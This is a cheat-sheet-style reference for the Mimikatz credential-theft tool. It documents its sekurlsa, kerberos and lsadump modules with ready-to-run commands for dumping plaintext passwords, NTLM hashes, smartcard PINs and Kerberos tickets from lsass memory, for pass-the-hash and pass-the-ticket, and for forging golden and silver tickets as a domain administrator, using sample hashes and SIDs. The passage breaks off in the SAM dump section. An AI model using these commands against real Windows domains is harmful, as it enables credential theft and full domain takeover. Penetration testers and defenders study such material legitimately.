### sekurlsa
>This module extracts **passwords**, **keys**, **pin codes**, **tickets** from the memory of `lsass`

>Without rights to access `lsass` process, all commands will fail with an error like this: `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)` _(except when working with a minidump)_.

__Starting with Windows 8.x and 10, *by default*, there is no password in memory.__

_Exceptions:_
- When DC is/are unreachable, the `kerberos` provider keeps passwords for future negocation ;
- When `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`, `UseLogonCredential` (DWORD) is set to `1`, the `wdigest` provider keeps passwords ;
- When values in `Allow*` in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Credssp\PolicyDefaults` or `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation`, the `tspkgs` / CredSSP provider keeps passwords.

Of course, not when using _Credential Guard_.

#### logonpasswords
- plain text passwords
```powershell
sekurlsa::logonpasswords
```

#### pth
- It starts a process with a fake identity, then replaces fake information (`NTLM` hash of the fake password) with real information (`NTLM` hash of the real password).

```powershell
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
```

#### tickets
- List and export Kerberos tickets of all sessions. 
- Unlike [kerberos::list](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#list), `sekurlsa` uses memory reading and is not subject to key export restrictions. `sekurlsa` can access tickets of others sessions (users).
- `/export` - _optional_ - tickets are exported in `.kirbi` files. They start with user's `LUID` and group number (`0` = `TGS`, `1` = `client ticket`(?) and `2` = `TGT`)

```powershell
sekurlsa::tickets /export
```

#### ekeys
```powershell
sekurlsa::ekeys
```

#### dpapi
```powershell
sekurlsa::dpapi
```

#### mimidump
```powershell
sekurlsa::minidump lsass.dmp
```

#### kerberos
- When using smartcard logon on the domain, `lsass` caches PIN code of the smartcard
```powershell
sekurlsa::kerberos
```

---
### Kerberos
>This module can be used without any privilege. It permits to play with official Microsoft Kerberos API - [http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx](http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx) - and to create offline 'Golden tickets', _free, long duration_ `TGT` tickets for any users 😄

#### ptt
- Injects one, or multiple, Kerberos ticket(s) in the current session (`TGT` or `TGS`).

```powershell
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi
```

#### golden/silver
- This command create Kerberos ticket, a `TGT` or a `TGS` with arbitrary data, for any user you want, in groups you want... (eg: the domain administrator 😤).

**Arguments:**

_Common:_

- `/domain` - the fully qualified domain name (eg: `chocolate.local`).
- `/sid` - the SID of the **domain** (eg: `S-1-5-21-130452501-2365100805-3685010670`).
- `/user` - the username you want to impersonate, keep in mind that Administrator is not the only name for this well-known account.
- `/id` - _optional_ - the id of the user - default is: `500` for the well-known Administrator.
- `/groups` - _optional_ - id of groups the user belongs (first is primary group, comma separator) - default is: `513,512,520,518,519` for the well-known Administrator's groups.

_Key:_  
Keys depend of ticket :

- for a **Golden**, they are from the `krbtgt` account;
- for a **Silver**, it comes from the "computer account" or "service account".

All of that, from `NTDS.DIT`, [`lsadump::dcsync`](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#dcsync), [`lsadump::lsa /inject`](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#lsa) or [`lsadump::lsa /patch`](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#lsa)). You must choose one :

- `/rc4` or `/krbtgt` - the `NTLM` hash
- `/aes128` - the AES128 key
- `/aes256` - the AES256 key

_*Target & Service for a Silver Ticket:*_

- `/target` - the server/computer name where the service is hosted (ex: `share.server.local`, `sql.server.local:1433`, ...)
- `/service` - The service name for the ticket (ex: `cifs`, `rpcss`, `http`, `mssql`, ...)

_*Target Ticket:*_

- `/ticket` - _optional_ - filename for output the ticket - default is: `ticket.kirbi`.
- `/ptt` - no output in file, just inject the golden ticket in current session.

_Lifetime:_  
By default, the Golden Ticket default lifetime is 10 years, but since BlackHat & Defcon 2014 it can be configured. All offsets are **in minutes**

- `/startoffset` - _optional_ - the start offset, negative to go in past, positive to have one ticket in future
- `/endin` - _optional_ - how long the ticket is (from start)
- `/renewmax` - _optional_ - how long maximum, renewals included, the ticket is (from start)

```powershell
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
```

#### TGT
- Displays informations about the `TGT` of the current session.
```powershell
kerberos::tgt
```

#### list
- Lists and export Kerberos tickets (`TGT` and `TGS`) of the current session.
```powershell
kerberos::list /export
```

#### purge
- Purges all tickets of the current session.
```powershell
kerberos::purge
```

---
### lsadump
#### sam
- This command dumps the Security Account Managers (`SAM`) database. It contains NTLM, and sometimes LM hash, of users passwords. It can work in two modes: online (with `SYSTEM` user or token) or offline (with `SYSTEM` & `SAM` hives or backup)

